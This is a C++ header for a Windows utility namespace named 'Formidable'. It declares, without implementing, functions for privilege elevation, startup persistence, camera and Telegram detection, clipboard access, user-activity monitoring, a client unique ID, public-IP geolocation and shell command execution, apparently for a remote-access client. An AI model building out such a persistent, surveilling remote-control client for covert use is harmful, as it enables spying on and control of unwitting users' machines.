#ifndef FORMIDABLE_UTILS_H
#define FORMIDABLE_UTILS_H
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <cstdint>
namespace Formidable {
    // 编码转换
    std::string WideToUTF8(const std::wstring& wstr);
    std::wstring UTF8ToWide(const std::string& str);
    // 系统信息获取
    std::string GetOSVersion();
    int GetOSBits();
    int GetCPUCores();
    double GetTotalMemoryGB();
    std::string GetCpuBrand();
    std::string GetProcessStartTime();
    std::string GetExeVersion();
    std::string GetSystemUptime();
    std::string GetLocalIP();
    std::string GetPublicIP();
    std::string GetLocationByIP(const std::string& ip);
    
    // 线程管理
    void SetThreadName(HANDLE hThread, const std::wstring& name);
    void SetThreadName(const std::wstring& name); // 设置当前线程名

    // 权限管理
    bool EnableDebugPrivilege();
    bool IsAdmin();
    bool SelfElevate(); // 尝试提权运行
    // 进程管理增强
    struct ProcessDetail {
        uint32_t pid;
        uint32_t parentPid;
        uint32_t threads;
        std::string name;
        std::string path;
        std::string user;
        bool is64Bit;
    };
    std::vector<ProcessDetail> GetDetailedProcessList();
    bool KillProcess(uint32_t pid);
    // 窗口管理增强
    struct WindowDetail {
        uint64_t hwnd;
        uint32_t pid;
        std::string title;
        std::string className;
        bool isVisible;
        std::string status; // normal, minimized, maximized
    };
    std::vector<WindowDetail> GetDetailedWindowList();
    // 网络连接信息
    struct NetConnection {
        std::string localAddr;
        uint16_t localPort;
        std::string remoteAddr;
        uint16_t remotePort;
        std::string state; // LISTENING, ESTABLISHED, etc.
        std::string type;  // TCP, UDP
        uint32_t pid;
    };
    std::vector<NetConnection> GetNetConnections();
    // 服务管理
    struct ServiceDetail {
        std::string name;
        std::string displayName;
        std::string status; // Running, Stopped, etc.
        std::string startType; // Auto, Manual, Disabled
        uint32_t pid;
    };
    std::vector<ServiceDetail> GetServiceList();
    // 自动启动管理
    bool AddToStartup(const std::string& name, const std::string& path);
    bool RemoveFromStartup(const std::string& name);
    // 硬件与软件检测
    bool CheckCameraExistence();
    bool CheckTelegramInstalled();

    // 路径管理
    std::wstring ExpandPath(const std::wstring& path);

    // 唯一标识获取
    uint64_t Fnv1a64(const void* data, size_t len);
    uint64_t GetStableClientUniqueId(uint64_t configId = 0);

    // 会话与系统管理
    bool IsUserSessionActive();
    
    // 剪贴板管理
    std::string GetClipboardText();
    void SetClipboardText(const std::string& text);

    // 用户活动检测
    class ActivityMonitor {
    public:
        static std::string GetStatus();
    private:
        static DWORD GetUserIdleTime();
        static bool IsWorkstationLocked();
        static std::string GetActiveWindowTitle();
    };

    // 性能监控与执行
    float GetCpuLoad();
    uint64_t GetMemoryUsage();
    float GetDiskUsage();
    std::string ExecuteCmdAndGetOutput(const std::string& cmd);
}
#endif // FORMIDABLE_UTILS_H
